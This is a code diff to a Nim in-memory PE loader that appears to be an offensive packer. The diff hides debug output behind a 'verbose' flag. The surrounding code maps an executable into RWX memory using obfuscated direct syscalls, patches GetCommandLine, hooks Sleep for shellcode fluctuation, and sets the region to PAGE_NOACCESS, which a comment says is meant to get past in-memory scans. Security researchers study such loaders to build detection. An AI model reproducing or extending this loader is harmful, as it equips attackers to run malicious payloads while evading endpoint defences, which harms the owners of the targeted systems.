@@ -127,7 +127,8 @@ proc fixIAT*(modulePtr: PVOID): bool =
             else:
                 var wcmdlenaddr = GetProcAddress(hmodule,"_wcmdln") 
             if wcmdlenaddr != nil:
-                echo obf("Found _wcmdln -> patching with arguments")
+                when defined(verbose):
+                  echo obf("Found _wcmdln -> patching with arguments")
                 var newCmd = newWideCString(commandStr) # we have to prepend 
                 patchMemory(wcmdlenaddr, cast[array[sizeOf(pointer), byte]](newCmd))
             when defined(DInvoke):
@@ -135,7 +136,8 @@ proc fixIAT*(modulePtr: PVOID): bool =
             else:
                 var acmdlenaddr = GetProcAddress(hmodule,"_acmdln") 
             if acmdlenaddr != nil:
-                echo obf("Found _acmdln -> patching with arguments")
+                when defined(verbose):
+                  echo obf("Found _acmdln -> patching with arguments")
                 var newCmd = &(commandStr)
                 patchMemory(acmdlenaddr, cast[array[sizeOf(pointer), byte]](newCmd))
                 
@@ -179,10 +181,12 @@ proc fixIAT*(modulePtr: PVOID): bool =
           when defined(args):
             # patch common Win32 functions to get the command line
             if exeArgsPassed and "GetCommandLineW" == $$func_name:
-                echo obf("[>] Patching function to pass exeArgs: "), func_name
+                when defined(verbose):
+                  echo obf("[>] Patching function to pass exeArgs: "), func_name
                 patchArgFunctionMemory(cast[pointer](libaddr), cast[pointer](newWideCString(commandStr)))
             if exeArgsPassed and $$"GetCommandLineA" == func_name:
-                echo obf("[>] Patching function to pass exeArgs: "), func_name
+                when defined(verbose):
+                  echo obf("[>] Patching function to pass exeArgs: "), func_name
                 patchArgFunctionMemory(cast[pointer](libaddr), cast[pointer](&commandStr))
     
         inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
@@ -198,13 +202,15 @@ proc pwndem(): void =
     var preferAddr: LPVOID = nil
     var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(peToLoadPtr))
     if (ntHeader == nil):
-      echo obf("[+] File isn't a PE file.")
+      when defined(verbose):
+        echo obf("[+] File isn't a PE file.")
       quit()
 
     var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(peToLoadPtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
     preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
     
-    echo $ntHeader.OptionalHeader.SizeOfImage
+    when defined(verbose):
+      echo $ntHeader.OptionalHeader.SizeOfImage
 
     when defined(Fluctuate):
         g_fluctuationData.shellcodeAddr = dectext[0].addr
@@ -218,9 +224,11 @@ proc pwndem(): void =
         g_fluctuationData.protect = PAGE_READWRITE
         g_fluctuate = FluctuateToRW
         if (hookSleep()):
-            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+            when defined(verbose):
+              echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
         else:
-            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+            when defined(verbose):
+              echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
     
     var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
     var ds: LPVOID
@@ -229,18 +237,21 @@ proc pwndem(): void =
         if getSyscall(ntAllocTable):
             syscall = ntAllocTable.wSysCall
         else:
-            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            when defined(verbose):
+              echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
     when defined(SysWhispers):
         status = oqiahsjynmxkla(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
     else:
         status = NtAllocateVirtualMemory(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
     
-    echo obf("NtAllocateVirtualMemory:")
-    echo status
+    when defined(verbose):
+      echo obf("NtAllocateVirtualMemory:")
+      echo status
     
     
     if (preferAddr == nil and relocDir == nil):
-      echo obf("[-] Allocate Image Base At Failure.\n")
+      when defined(verbose):
+        echo obf("[-] Allocate Image Base At Failure.\n")
       quit()
     
     ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
@@ -249,14 +260,16 @@ proc pwndem(): void =
         if getSyscall(ntWriteTable):
             syscall = ntWriteTable.wSysCall
         else:
-            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            when defined(verbose):
+              echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
     when defined(SysWhispers):
         status = oqiazasusjk(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
     else:
         status = NtWriteVirtualMemory(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
     
-    echo obf("NtWriteVirtualMemory:")
-    echo status
+    when defined(verbose):
+      echo obf("NtWriteVirtualMemory:")
+      echo status
     
     
     var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
@@ -268,8 +281,9 @@ proc pwndem(): void =
         status = oqiazasusjk(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
       else:
           status = NtWriteVirtualMemory(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
-      echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
-      echo status
+      when defined(verbose):
+        echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
+        echo status
       inc(i)
     
     var goodrun = fixIAT(preferAddr)
@@ -291,11 +305,13 @@ proc pwndem(): void =
     # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
     status =  NtProtectVirtualMemory(curProcHandle,addr protectAddress,addr allocsize,0x01,addr op)
     if (status != 0):
-        echo obf("NtProtectVirtualMemory failed")
-        echo status
-        echo GetLastError()
+        when defined(verbose):
+          echo obf("NtProtectVirtualMemory failed")
+          echo status
+          echo GetLastError()
     else:
-        echo obf("[*] OldProtect set back")
+        when defined(verbose):
+          echo obf("[*] OldProtect set back")
 
 ]#
 
